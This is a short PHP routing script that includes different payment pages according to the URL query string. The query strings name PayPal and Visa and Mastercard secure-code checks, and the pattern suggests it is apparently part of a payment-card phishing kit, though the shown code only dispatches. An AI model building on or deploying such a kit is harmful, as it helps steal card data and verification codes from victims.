<?php 
	  $fullUrl = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
	  	if (strpos($fullUrl, "?choise") == true) {
	  		include("includes/pay.inc.php");
		}elseif (strpos($fullUrl, "?pay") == true) {
		   	include("includes/payoption.inc.php");
		}elseif (strpos($fullUrl, "?pypl") == true) {
		   	include("includes/ppl.inc.php");
		}elseif (stripos($fullUrl, "?secure_code_v")) {
			include("includes/check_v.inc.php");
		}elseif (stripos($fullUrl, "?secure_code_m")) {
			include("includes/check_m.inc.php");
		}else{
		  	include("includes/pay.inc.php");
		}		  
?>